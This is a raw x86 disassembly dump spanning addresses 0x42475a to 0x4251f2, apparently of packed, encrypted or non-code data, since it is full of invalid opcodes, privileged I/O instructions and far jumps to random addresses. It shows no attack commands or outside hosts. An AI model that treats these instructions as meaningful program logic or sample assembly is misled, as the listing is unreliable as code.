  42475a:	sar    BYTE PTR [edi],cl
  42475c:	add    eax,0xc68e839
  424761:	push   ebp
  424762:	fwait
  424763:	mov    al,0x25
  424765:	outs   dx,DWORD PTR ds:[esi]
  424767:	mov    edi,0x46849a0a
  42476c:	push   0xf3879c6
  424771:	adc    eax,0x4fafc3a1
  424776:	cmp    bh,BYTE PTR [esi]
  424778:	lds    esp,FWORD PTR [ebx-0x1c1c6361]
  42477e:	frstor [ebx-0x61]
  424781:	jge    0x42476f
  424783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424784:	loop   0x424709
  424786:	adc    eax,0x4e8abb1e
  42478b:	and    ecx,edi
  42478d:	leave  
  42478e:	mov    al,0xb8
  424790:	jae    0x4247dd
  424792:	js     0x424780
  424794:	ret    0x35f2
  424797:	adc    DWORD PTR [edx],ecx
  424799:	add    al,0x5e
  42479b:	push   cs
  42479c:	(bad)  
  42479e:	push   esi
  42479f:	jne    0x42479b
  4247a1:	shl    DWORD PTR [edi-0x71dcfbbd],0x7b
  4247a8:	fidiv  WORD PTR [ebp+0x72cce0f1]
  4247ae:	mov    ebp,0xa7cc244c
  4247b3:	xor    BYTE PTR [edi+0x0],0x0
	...
  424816:	and    bl,BYTE PTR [eax-0x7c]
  424819:	out    dx,eax
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax-0xf9707de],0xe2
  424825:	popf   
  424826:	les    eax,FWORD PTR [ecx+eax*1+0x10700]
  42482d:	add    dh,dl
  42482f:	push   0x74002c9d
  424834:	dec    ebx
  424835:	ror    BYTE PTR fs:[ebx+edx*1-0x7c],0x61
  42483b:	inc    ebp
  42483c:	fist   WORD PTR [ebx-0x4e]
  42483f:	out    0x18,al
  424841:	dec    edx
  424842:	fwait
  424843:	xchg   ebp,eax
  424844:	xor    ah,BYTE PTR [ebx+0x50]
  424847:	mov    al,0x5e
  424849:	test   al,dh
  42484b:	scas   eax,DWORD PTR es:[edi]
  42484c:	test   DWORD PTR ds:0x7b7cdca7,edi
  424852:	fistp  DWORD PTR [edx-0x1dcca818]
  424858:	inc    ebp
  424859:	mov    edi,0x850aad8
  42485e:	mov    bl,BYTE PTR ds:0xd3ad258d
  424864:	or     eax,0x54bdc48c
  424869:	mov    es:0xd0d3f835,eax
  42486f:	mov    ah,0xe1
  424871:	xchg   ebx,eax
  424872:	push   edx
  424873:	xchg   esp,eax
  424874:	add    BYTE PTR [ebp+0x688bb0c7],0xb4
  42487b:	(bad)  
  42487d:	repz adc BYTE PTR [edx],dl
  424880:	xor    DWORD PTR [esi+0x33b19af2],ebx
  424886:	inc    ecx
  424887:	hlt    
  424888:	js     0x424891
  42488a:	xor    bh,BYTE PTR ds:0x4ead8703
  424890:	aas    
  424891:	sahf   
  424892:	dec    esi
  424893:	call   0xea9d4d38
  424898:	xchg   BYTE PTR [eax],bl
  42489a:	mov    ebp,0x24971c7a
  42489f:	add    eax,0x6d47efda
  4248a4:	sti    
  4248a5:	jmp    0x5de745a7
  4248aa:	push   ecx
  4248ab:	jl     0x4248af
  4248ad:	mov    BYTE PTR [ebx],al
  4248af:	ret    0x7728
  4248b2:	pop    eax
  4248b3:	(bad)  [ebp+0x62d9809a]
  4248b9:	clc    
  4248ba:	je     0x4248c1
  4248bc:	mov    ds,WORD PTR [edx+0x34]
  4248bf:	xchg   esp,eax
  4248c0:	test   al,0xc0
  4248c2:	pop    ss
  4248c3:	(bad)
  4248c6:	or     bh,bh
  4248c8:	push   es
  4248c9:	fwait
  4248ca:	xchg   edi,eax
  4248cb:	sub    BYTE PTR [esi+0x6c],0x25
  4248cf:	adc    eax,0xb13be5a2
  4248d4:	mov    eax,ds:0xedf0b207
  4248d9:	addr16 daa 
  4248db:	jl     0x424874
  4248dd:	add    BYTE PTR [ecx-0x62],0xbd
  4248e1:	jne    0x424941
  4248e3:	jns    0x4248cc
  4248e5:	(bad)  
  4248e7:	push   cs
  4248e8:	inc    sp
  4248ea:	scas   al,BYTE PTR es:[di]
  4248ec:	cmc    
  4248ed:	push   ecx
  4248ee:	enter  0xf354,0x55
  4248f2:	xchg   edi,eax
  4248f3:	dec    ebp
  4248f4:	jb     0x42489c
  4248f6:	retf   
  4248f7:	jge    0x424949
  4248f9:	sub    eax,0xcfa708e7
  4248fe:	sub    DWORD PTR [eax+0x4],0xfffffff5
  424902:	dec    eax
  424903:	(bad)  
  424905:	xchg   DWORD PTR [edx-0x49bfc5dc],edx
  42490b:	(bad)  
  42490c:	mov    ebp,0xdd6aec4b
  424911:	(bad)  
  424912:	xor    eax,0x50c07845
  424917:	sbb    al,0x15
  424919:	adc    DWORD PTR [edi],esi
  42491b:	arpl   WORD PTR [eax],cx
  42491d:	mov    eax,0xdacf4bd5
  424922:	fstp   TBYTE PTR [edi]
  424924:	mov    cl,0xef
  424926:	mov    esi,0x173f520c
  42492b:	outs   dx,DWORD PTR ds:[esi]
  42492c:	xchg   edi,eax
  42492d:	mov    ebx,0xbef3c25e
  424932:	xchg   DWORD PTR [esi],esp
  424934:	sub    DWORD PTR [eax],eax
	...
  424996:	imul   ebx,DWORD PTR [eax],0x63
  424999:	push   0x73
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0xc385bac2
  4249a4:	ins    BYTE PTR es:[edi],dx
  4249a5:	xor    cl,bl
  4249a7:	test   DWORD PTR [ecx],eax
  4249a9:	add    BYTE PTR [edi],al
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    bl,bl
  4249af:	popf   
  4249b0:	mov    al,ds:0x28a0333c
  4249b5:	fbstp  TBYTE PTR [ecx]
  4249b7:	fcom   DWORD PTR [esi-0x4ad1923b]
  4249bd:	push   cs
  4249be:	cmp    al,0x2
  4249c0:	and    eax,0xd6791d89
  4249c5:	mov    ah,0x21
  4249c7:	dec    ebp
  4249c8:	mov    ds:0x7f62ce05,al
  4249cd:	lock mov bl,0x2e
  4249d0:	popf   
  4249d1:	push   0x4708f860
  4249d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249d7:	dec    ebp
  4249d8:	pop    ss
  4249d9:	jge    0x4249a8
  4249db:	imul   ecx,edx,0xfffffffe
  4249de:	ja     0x424a38
  4249e0:	push   0xffffffb8
  4249e2:	pop    ebp
  4249e3:	xchg   DWORD PTR [edi-0x6975354a],esp
  4249e9:	mov    ah,0x52
  4249eb:	add    BYTE PTR [edi],al
  4249ed:	into   
  4249ee:	xor    edi,ebp
  4249f0:	jae    0x424989
  4249f2:	mov    ch,0x85
  4249f4:	(bad)  
  4249f5:	fwait
  4249f6:	sub    BYTE PTR [bx+di],0x5a
  4249fa:	popa   
  4249fb:	jns    0x424a51
  4249fd:	ins    DWORD PTR es:[edi],dx
  4249fe:	je     0x4249f7
  424a00:	xor    BYTE PTR [edx+0x6a],0x3f
  424a04:	push   esp
  424a05:	loope  0x424a43
  424a07:	bound  esp,QWORD PTR [edx+0x78142bd7]
  424a0d:	xchg   DWORD PTR [edi-0x10],edi
  424a10:	or     bl,bl
  424a12:	mov    edx,0x2f14a980
  424a17:	fistp  DWORD PTR [eax+0x16ddae5e]
  424a1d:	mov    edi,0xce94924b
  424a22:	sahf   
  424a23:	arpl   WORD PTR [edx-0x7a8ae6b6],cx
  424a29:	(bad)  
  424a2a:	inc    cx
  424a2c:	jo     0x424a51
  424a2e:	inc    eax
  424a2f:	pop    es
  424a30:	hlt    
  424a31:	pop    esp
  424a32:	aad    0x65
  424a34:	cmc    
  424a35:	fwait
  424a36:	in     al,dx
  424a37:	in     al,0xf6
  424a39:	mov    WORD PTR [ebx-0x5f],ds
  424a3c:	sub    ebx,DWORD PTR [eax]
  424a3e:	and    ebp,DWORD PTR [edi]
  424a40:	inc    ecx
  424a41:	xor    DWORD PTR [edx+0x25],edx
  424a44:	aad    0xf9
  424a46:	pop    edi
  424a47:	in     al,0x41
  424a49:	sub    ecx,DWORD PTR [edi]
  424a4b:	adc    DWORD PTR [edx+0x20cbfc59],eax
  424a51:	jne    0x424a76
  424a53:	popa   
  424a54:	mov    BYTE PTR [esi+0x36bdb0f2],al
  424a5a:	mov    al,ds:0x7071462a
  424a5f:	mov    ecx,0x7518edf3
  424a64:	popf   
  424a65:	in     al,0x9b
  424a67:	imul   esi,ebp,0xffffffdf
  424a6a:	cmp    DWORD PTR [eax-0x75],ebx
  424a6d:	adc    ebx,ecx
  424a6f:	xchg   ecx,eax
  424a70:	cmp    eax,0x87d95e82
  424a75:	in     al,dx
  424a76:	cdq    
  424a77:	xchg   esi,eax
  424a78:	scas   eax,DWORD PTR es:[edi]
  424a79:	stos   BYTE PTR es:[edi],al
  424a7a:	or     eax,0xd5b523bf
  424a7f:	and    esi,DWORD PTR [edx-0x6e]
  424a82:	push   ebx
  424a83:	and    BYTE PTR [ecx],bh
  424a85:	mov    edi,0x31681162
  424a8a:	pop    edi
  424a8b:	cmp    eax,0xd05f30eb
  424a90:	sbb    ch,cl
  424a92:	dec    eax
  424a93:	fwait
  424a94:	pop    ecx
  424a95:	das    
  424a96:	test   al,0x13
  424a98:	loope  0x424aff
  424a9a:	push   eax
  424a9b:	mov    ds:0x921aa30,al
  424aa0:	mov    bl,0xd
  424aa2:	mov    dh,0x29
  424aa4:	xor    al,0x4e
  424aa6:	sbb    al,0x51
  424aa8:	sbb    BYTE PTR [ecx+edx*1-0x18f62829],cl
  424aaf:	out    dx,eax
  424ab0:	mov    cl,0xad
  424ab2:	cmc    
  424ab3:	cld    
  424ab4:	cld    
	...
  424b15:	add    BYTE PTR [esi],al
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	ror    BYTE PTR [edx-0x2e],0x52
  424b26:	rol    BYTE PTR [esi+0x1070001],cl
  424b2c:	add    BYTE PTR [eax],al
  424b2e:	sbb    eax,0x123f0f31
  424b33:	cs retf 0x7373
  424b37:	dec    edx
  424b38:	cmp    edx,DWORD PTR [ecx]
  424b3a:	mov    ebp,DWORD PTR ds:0xfc8b523a
  424b40:	rcl    DWORD PTR [edx+0x4f92bf75],cl
  424b46:	xor    BYTE PTR [esi-0x1550a37f],al
  424b4c:	lea    esi,[ecx-0x4ecf3e92]
  424b52:	jmp    0x932f:0x7140ea67
  424b59:	mov    esp,0xf793404e
  424b5e:	icebp  
  424b5f:	sar    edx,1
  424b61:	cmp    ah,BYTE PTR [ebx-0x1a]
  424b64:	popf   
  424b65:	push   ebp
  424b66:	adc    al,0x6d
  424b68:	sbb    eax,0xf4d81921
  424b6d:	fiadd  WORD PTR es:[esi+0x4585cca8]
  424b74:	cmp    edx,DWORD PTR [ebp+edi*8-0xe]
  424b78:	movnti DWORD PTR [ebx+0x4fa53e8b],ebp
  424b7f:	pop    edi
  424b80:	or     dl,bh
  424b82:	cmp    BYTE PTR [edx+0x7874c956],dh
  424b88:	dec    esp
  424b89:	sub    DWORD PTR [edx+esi*8],eax
  424b8c:	adc    al,0x5a
  424b8e:	cwde   
  424b8f:	inc    ecx
  424b90:	push   esi
  424b91:	mov    BYTE PTR [ebx-0xc],dh
  424b94:	ja     0x424b51
  424b96:	enter  0xaef7,0xab
  424b9a:	push   eax
  424b9b:	out    dx,eax
  424b9c:	cdq    
  424b9d:	jne    0x424b87
  424b9f:	jae    0x424b7e
  424ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ba2:	imul   esp,DWORD PTR [edx-0x77e4f3f1],0xc25d63f
  424bac:	push   edx
  424bad:	cwde   
  424bae:	sub    ch,BYTE PTR [ebx+0x37928aaa]
  424bb4:	js     0x424b9c
  424bb6:	mov    ch,0x40
  424bb8:	inc    esi
  424bb9:	aam    0xa7
  424bbb:	addr16 push ecx
  424bbd:	scas   al,BYTE PTR es:[edi]
  424bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bbf:	in     eax,dx
  424bc0:	out    dx,eax
  424bc1:	mov    es,edi
  424bc3:	sbb    eax,0x556f6413
  424bc8:	mov    ch,BYTE PTR [ebx+0x7f]
  424bcb:	clc    
  424bcc:	in     eax,dx
  424bcd:	lahf   
  424bce:	jge    0x424b5e
  424bd0:	shr    DWORD PTR [esi-0x3a],0xf1
  424bd4:	sbb    BYTE PTR ds:0x6add9744,0x70
  424bdb:	push   ebx
  424bdc:	fstp   TBYTE PTR [esi+0x7d252992]
  424be2:	pushf  
  424be3:	loopne 0x424c59
  424be5:	inc    esp
  424be6:	pushf  
  424be7:	test   DWORD PTR [esi+eax*4],ebx
  424bea:	mov    ecx,DWORD PTR [ebx-0x3a]
  424bed:	mov    bh,0xb6
  424bef:	mov    al,0x35
  424bf1:	out    0x34,al
  424bf3:	(bad)  
  424bf4:	mov    al,0x95
  424bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bf7:	and    al,0x30
  424bf9:	(bad)  [ecx+eax*4-0x19]
  424bfd:	mov    bh,0x9f
  424bff:	daa    
  424c00:	sub    eax,0x72ac3e92
  424c05:	cmp    ebx,ebx
  424c07:	sbb    ebx,edx
  424c09:	cmp    eax,0x17d7c4ed
  424c0e:	(bad)  
  424c0f:	xor    ah,cl
  424c11:	pushf  
  424c12:	pushf  
  424c13:	mov    edi,0x9c50a560
  424c18:	dec    edx
  424c19:	and    edi,DWORD PTR [eax-0x2a]
  424c1c:	ins    BYTE PTR es:[edi],dx
  424c1d:	xor    eax,0x6bd9b2da
  424c22:	mov    bh,0x4e
  424c24:	mov    ds:0xfa1136a0,al
  424c29:	jg     0x424bb8
  424c2b:	fdiv   DWORD PTR [ebx-0x10]
  424c2e:	inc    edi
  424c2f:	ja     0x424c65
  424c31:	dec    esp
  424c32:	and    esp,DWORD PTR [eax+0xf0]
	...
  424c94:	add    BYTE PTR [eax],al
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424c9e:	sub    eax,0x60588c09
  424ca3:	je     0x424cff
  424ca5:	ins    DWORD PTR es:[edi],dx
  424ca6:	fld    DWORD PTR [edi+0x1070001]
  424cac:	add    BYTE PTR [eax],al
  424cae:	push   ds
  424caf:	push   esp
  424cb0:	xchg   esp,eax
  424cb1:	inc    edi
  424cb2:	pusha  
  424cb3:	aaa    
  424cb4:	les    ecx,FWORD PTR [esi-0x57]
  424cb7:	outs   dx,BYTE PTR ds:[esi]
  424cb8:	cmp    al,0xd9
  424cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cbb:	mov    ds:0xbf2cf7b1,eax
  424cc0:	lods   al,BYTE PTR ds:[esi]
  424cc1:	cs hlt 
  424cc3:	pop    edx
  424cc4:	test   bl,bl
  424cc6:	fidiv  DWORD PTR [ebx]
  424cc8:	add    DWORD PTR [ecx+ebp*1+0x54878b6a],esi
  424ccf:	jno    0x424d23
  424cd1:	data16 and BYTE PTR [esi-0x16f5d76],bh
  424cd8:	xchg   DWORD PTR [ecx],edx
  424cda:	loopne 0x424d3b
  424cdc:	add    ch,BYTE PTR [eax]
  424cde:	sbb    DWORD PTR [esi+ebp*4-0x1d],esp
  424ce2:	lea    esp,[edi+ecx*1-0x99c92e7]
  424ce9:	and    eax,0xf887fe7a
  424cee:	and    BYTE PTR ds:0xd30cd804,al
  424cf4:	push   ebx
  424cf5:	cli    
  424cf6:	aaa    
  424cf7:	pop    es
  424cf8:	push   ebx
  424cf9:	mov    eax,ds:0xb58b1a1
  424cfe:	pusha  
  424cff:	adc    al,dh
  424d01:	daa    
  424d02:	mov    ch,0x9d
  424d04:	inc    ebx
  424d05:	inc    esp
  424d06:	ds mov esi,0x9c0f4cb4
  424d0c:	aaa    
  424d0d:	or     esi,DWORD PTR [edi]
  424d0f:	sahf   
  424d10:	cmp    dh,BYTE PTR [esi-0x2558e179]
  424d16:	sbb    cl,BYTE PTR [ecx]
  424d18:	aam    0x2c
  424d1a:	xor    ebx,DWORD PTR [ebp-0x603a325b]
  424d20:	xlat   BYTE PTR ds:[ebx]
  424d21:	mov    edi,0xf087d25d
  424d26:	scas   al,BYTE PTR es:[edi]
  424d27:	sub    eax,0x1762a841
  424d2c:	sti    
  424d2d:	sahf   
  424d2e:	shr    DWORD PTR [edi],0x4f
  424d31:	aad    0xae
  424d33:	jnp    0x424cd1
  424d35:	stc    
  424d36:	mov    edx,0x78d18c4f
  424d3b:	jmp    0x7556:0x8edf889
  424d42:	ror    DWORD PTR [ebx+0x3f841cba],cl
  424d48:	pop    esp
  424d49:	jmp    0x22ac:0x313525cd
  424d50:	je     0x424d5f
  424d52:	xchg   ebp,eax
  424d53:	dec    ebx
  424d54:	ret    0x3fb0
  424d57:	inc    ebp
  424d58:	fisttp QWORD PTR [esi]
  424d5a:	scas   al,BYTE PTR es:[edi]
  424d5b:	push   edx
  424d5c:	or     edi,DWORD PTR [eax-0x20d67b9e]
  424d62:	aaa    
  424d63:	cld    
  424d64:	pushf  
  424d65:	push   ss
  424d66:	mov    esp,0xb162849a
  424d6b:	jns    0x424da4
  424d6d:	sbb    edi,DWORD PTR [esi+0x1f8f16e0]
  424d73:	mov    es,WORD PTR [ecx+0x11a702b8]
  424d79:	loopne 0x424dba
  424d7b:	popf   
  424d7c:	xor    al,0xc
  424d7e:	and    DWORD PTR fs:[esi+0x5e],edi
  424d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d83:	fsubr  QWORD PTR [edi]
  424d85:	push   0xfd6fcba
  424d8a:	clc    
  424d8b:	xor    eax,ebp
  424d8d:	xchg   esp,eax
  424d8e:	or     ch,BYTE PTR [ebx]
  424d90:	dec    edi
  424d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d92:	in     al,dx
  424d93:	pop    esi
  424d94:	jmp    0x4e82c52e
  424d99:	lods   eax,DWORD PTR ds:[esi]
  424d9a:	mov    dh,0x63
  424d9c:	mov    ebx,0x730b8d4f
  424da1:	mov    esp,0x95d6de64
  424da6:	sub    eax,0x9059c3c
  424dab:	retf   
  424dac:	add    dl,BYTE PTR [ecx-0x586c1064]
  424db2:	sbb    BYTE PTR [edi-0x6a],0x0
	...
  424e16:	cmp    eax,0xf361d20c
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [eax],esp
  424e23:	in     eax,dx
  424e24:	mov    ch,0x7d
  424e26:	loopne 0x424db0
  424e28:	add    DWORD PTR [eax],eax
  424e2a:	pop    es
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [edi+0x5d915ea2],cl
  424e33:	test   al,0xe
  424e35:	pop    edi
  424e36:	mov    edi,0x5956b73c
  424e3b:	mov    eax,ds:0x52f4294d
  424e40:	aad    0xed
  424e42:	loope  0x424e51
  424e44:	out    dx,al
  424e45:	es fs pushf 
  424e48:	cwde   
  424e49:	jl     0x424dde
  424e4b:	adc    eax,0x596c14c6
  424e50:	shl    BYTE PTR [ecx-0x34],0x37
  424e54:	mov    esp,DWORD PTR [eax-0x51d1278]
  424e5a:	pushf  
  424e5b:	pop    esp
  424e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e5d:	mov    ds:0xc0945b71,al
  424e62:	fsubp  st(6),st
  424e64:	retf   
  424e65:	sar    BYTE PTR [ebp+0x36f61702],cl
  424e6b:	(bad)  
  424e6c:	fs fdivp st(2),st
  424e6f:	push   0xffffffd5
  424e71:	test   eax,0xaed63e21
  424e76:	dec    esp
  424e77:	ds inc esi
  424e79:	mov    DWORD PTR [ebx+ebp*1+0x6e843c8b],ebp
  424e80:	fimul  WORD PTR [ebp+0x1]
  424e83:	ret    0x79b0
  424e86:	test   BYTE PTR [eiz*8+0x70819f4],ch
  424e8d:	out    dx,eax
  424e8e:	cmp    BYTE PTR [edx-0x74],dl
  424e91:	dec    eax
  424e92:	aaa    
  424e93:	mov    ebx,edx
  424e95:	test   al,0x21
  424e97:	gs jmp 0xd984dffe
  424e9d:	outs   dx,DWORD PTR ds:[esi]
  424e9e:	adc    BYTE PTR [esi],bl
  424ea0:	mov    al,0x42
  424ea2:	stc    
  424ea3:	mov    dl,0xf3
  424ea5:	xchg   BYTE PTR [ecx-0x18],bl
  424ea8:	cdq    
  424ea9:	sti    
  424eaa:	loopne 0x424f16
  424eac:	add    eax,0x10ca94ea
  424eb1:	add    BYTE PTR ds:0x465bdbc5,0xfd
  424eb8:	xor    ebx,DWORD PTR [edx-0x22]
  424ebb:	hlt    
  424ebc:	pop    eax
  424ebd:	push   ss
  424ebe:	sbb    BYTE PTR [eax-0x17],bh
  424ec1:	dec    esp
  424ec2:	sub    cl,BYTE PTR [eax+0x435126b0]
  424ec8:	imul   esp,edi,0x12beb467
  424ece:	jo     0x424f3b
  424ed0:	test   al,0xfa
  424ed2:	add    DWORD PTR [edi-0x50],edi
  424ed5:	push   es
  424ed6:	push   cs
  424ed7:	lods   eax,DWORD PTR ds:[esi]
  424ed8:	in     eax,dx
  424ed9:	dec    eax
  424eda:	pop    ebx
  424edb:	sbb    eax,0x89bbc5fb
  424ee0:	sub    al,0xc5
  424ee2:	out    dx,eax
  424ee3:	std    
  424ee4:	dec    ecx
  424ee5:	imul   ebp,ebp,0x4c
  424ee8:	(bad)  
  424ee9:	cmp    esp,DWORD PTR [ebp+0x58886716]
  424eef:	or     BYTE PTR [edi+0x99426b1],al
  424ef5:	xor    bh,BYTE PTR [edx+0x1f]
  424ef8:	(bad)  
  424ef9:	fwait
  424efa:	shl    DWORD PTR [ebp+0x20],cl
  424efd:	mov    edx,0x24abe0eb
  424f02:	jmp    DWORD PTR [eax+eax*2+0x61]
  424f06:	mov    dl,0xba
  424f08:	sti    
  424f09:	add    BYTE PTR ds:[edx-0x18],dh
  424f0d:	mov    edi,0x1d51825a
  424f12:	xchg   edx,eax
  424f13:	add    DWORD PTR [edx-0x71],0x5c8dc54a
  424f1a:	js     0x424f4d
  424f1c:	in     al,dx
  424f1d:	mov    ebx,0x8a6a5a43
  424f22:	fst    st(1)
  424f24:	popf   
  424f25:	call   0xcf9585e9
  424f2a:	push   ecx
  424f2b:	lahf   
  424f2c:	fwait
  424f2d:	aas    
  424f2e:	fdiv   st,st(4)
  424f30:	(bad)  
  424f31:	jo     0x424f05
  424f33:	and    bl,al
	...
  424f95:	add    BYTE PTR [ebx+0x16],cl
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax-0x4f0ce818],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    BYTE PTR [ebp+ebx*4-0x63721080],al
  424fb4:	mov    ch,0x8e
  424fb6:	lea    ecx,[ebx+0x79]
  424fb9:	inc    BYTE PTR [esi+0x1cd93fc0]
  424fbf:	sahf   
  424fc0:	push   edi
  424fc1:	lock ds repnz pop ecx
  424fc5:	daa    
  424fc6:	aad    0xf3
  424fc8:	fisubr DWORD PTR [edx]
  424fca:	mov    ah,0x98
  424fcc:	lahf   
  424fcd:	fnstenv [ecx+0x7d0eada3]
  424fd3:	ret    
  424fd4:	mul    DWORD PTR [ecx]
  424fd6:	mov    DWORD PTR [ecx+eax*4+0x2ebb7f3f],0xabbb7a68
  424fe1:	jne    0x424fdd
  424fe3:	xor    eax,0xee891762
  424fe8:	pop    esp
  424fe9:	mov    bl,0xfd
  424feb:	adc    eax,0x33fdbeff
  424ff0:	out    0xe0,eax
  424ff2:	repnz mov bh,0x2e
  424ff5:	sbb    dh,ah
  424ff7:	push   es
  424ff8:	jle    0x425046
  424ffa:	test   DWORD PTR [edx+ebx*2],esi
  424ffd:	mov    ebp,0x1c79266
  425002:	and    al,0x6b
  425004:	dec    ecx
  425005:	lds    esi,FWORD PTR [edx+edx*4+0x47]
  425009:	leave  
  42500a:	mov    dl,0xc
  42500c:	fwait
  42500d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42500e:	push   ds
  42500f:	imul   esp
  425011:	pusha  
  425012:	dec    ecx
  425013:	cmp    al,0xa2
  425015:	push   eax
  425016:	imul   ebp,esi,0x79
  425019:	lock inc edx
  42501b:	loop   0x424fef
  42501d:	adc    cl,BYTE PTR [edx-0x14]
  425020:	xor    al,al
  425022:	add    esi,DWORD PTR [esp+edi*1-0x5cf2f9f1]
  425029:	add    bl,BYTE PTR es:[esi]
  42502c:	pop    ss
  42502d:	fmul   DWORD PTR [ecx]
  42502f:	sbb    DWORD PTR [esp+ebp*1],0x9b63c22d
  425036:	dec    esi
  425037:	cmp    cl,BYTE PTR [esi-0xf]
  42503a:	dec    esp
  42503b:	add    eax,0x47036663
  425040:	(bad)  
  425042:	and    DWORD PTR [ecx+0x1fc23a5f],0x47a07e3e
  42504c:	dec    ebp
  42504d:	add    eax,ebp
  42504f:	xor    al,ah
  425051:	mov    ch,0xb7
  425053:	aam    0x92
  425055:	gs loop 0x42500b
  425058:	inc    ebp
  425059:	mov    dl,0x3
  42505b:	adc    BYTE PTR [eax+eax*8-0x771d2c91],bl
  425062:	enter  0x2b0e,0x1c
  425066:	div    dl
  425068:	inc    esp
  425069:	jbe    0x4250c1
  42506b:	(bad)  
  42506c:	cdq    
  42506d:	sub    BYTE PTR [eax-0x71],dl
  425070:	(bad)  
  425071:	rol    DWORD PTR [ecx+0x33],0xe4
  425075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425076:	rol    DWORD PTR [eax+0x73558b17],1
  42507c:	int    0xe2
  42507e:	add    DWORD PTR fs:[ebp-0x80],esp
  425082:	fild   DWORD PTR [esi+0x8]
  425085:	test   eax,0xfe61cbde
  42508a:	and    BYTE PTR [ebp+eiz*2+0x5],bh
  42508e:	inc    esp
  42508f:	dec    edi
  425090:	ins    BYTE PTR es:[edi],dx
  425091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425092:	stos   DWORD PTR es:[edi],eax
  425093:	inc    esp
  425094:	fld    TBYTE PTR [ecx+0x4a4a1fff]
  42509a:	das    
  42509b:	sar    BYTE PTR [ebp+edx*8-0x7bf67058],0x66
  4250a3:	clc    
  4250a4:	jge    0x425066
  4250a6:	pop    edi
  4250a7:	add    ecx,edx
  4250a9:	in     eax,dx
  4250aa:	retf   
  4250ab:	xchg   ecx,eax
  4250ac:	jge    0x425098
  4250ae:	ins    DWORD PTR es:[edi],dx
  4250af:	lock add ebp,DWORD PTR [esi-0x3c]
  4250b3:	les    eax,FWORD PTR [esi]
	...
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	rcl    BYTE PTR [ebx-0x112d920a],cl
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [esi],bh
  42512f:	rol    DWORD PTR [edi-0x5b],0xa4
  425133:	loopne 0x4251a0
  425135:	mov    dl,0x49
  425137:	jmp    0x3687cac0
  42513c:	cmp    BYTE PTR [eax-0x3a],dl
  42513f:	xchg   ebp,eax
  425140:	loopne 0x425139
  425142:	pushf  
  425143:	or     al,0xac
  425145:	xor    eax,DWORD PTR [edi+eax*2+0x2e]
  425149:	xor    BYTE PTR [ebx+edx*1-0x669a8a4e],0xef
  425151:	add    bh,BYTE PTR [ebp-0x53]
  425154:	std    
  425155:	ins    BYTE PTR es:[edi],dx
  425156:	push   0x79
  425158:	cmp    esi,DWORD PTR [ebx-0x5e]
  42515b:	out    0x55,eax
  42515d:	js     0x42515f
  42515f:	jns    0x4250ea
  425161:	fiadd  WORD PTR [esi-0x65f2a1b]
  425167:	es sbb al,0x91
  42516a:	idiv   DWORD PTR [edi+ebp*4-0x39582708]
  425171:	inc    ecx
  425172:	jbe    0x4251c8
  425174:	(bad)  [eax-0x78]
  425177:	add    al,0x61
  425179:	jmp    0x66a9:0x826358e5
  425180:	mov    al,ds:0x8b912eb9
  425185:	(bad)  
  425186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425187:	mov    dh,0xe2
  425189:	scas   al,BYTE PTR es:[edi]
  42518a:	das    
  42518b:	mov    bl,0xcd
  42518d:	rcr    BYTE PTR [eax],0xd5
  425190:	cmp    ah,BYTE PTR [edx]
  425192:	jb     0x4251e0
  425194:	in     al,0x11
  425196:	fimul  WORD PTR cs:[edx+0x7797145d]
  42519d:	sbb    BYTE PTR [ecx+0x6abdb942],cl
  4251a3:	and    al,0x92
  4251a5:	(bad)  
  4251a7:	cmp    eax,0xe48c6e96
  4251ac:	jmp    0x6cb4:0x198b119b
  4251b3:	int    0x69
  4251b5:	mov    dh,0x7f
  4251b7:	es ror edi,1
  4251ba:	inc    eax
  4251bb:	adc    al,0xdc
  4251bd:	inc    edi
  4251be:	out    dx,eax
  4251bf:	imul   edi,DWORD PTR [edi],0xf110269a
  4251c5:	inc    ecx
  4251c6:	cdq    
  4251c7:	lods   al,BYTE PTR ds:[esi]
  4251c8:	mov    ebx,0xf9f6ec13
  4251cd:	xchg   edx,eax
  4251ce:	call   0xb5f2:0xaea3e92b
  4251d5:	mul    DWORD PTR [ebx+0x500c14cd]
  4251db:	mov    cl,BYTE PTR [edi-0x6ba19368]
  4251e1:	mov    ds:0x9acdd384,eax
  4251e6:	dec    edx
  4251e7:	out    0x64,al
  4251e9:	in     al,dx
  4251ea:	xchg   al,dh
  4251ec:	sub    edx,DWORD PTR [esi]
  4251ee:	or     DWORD PTR [ecx],0x63
  4251f1:	push   edi
  4251f2:	neg    DWORD PTR [eax+0x10]
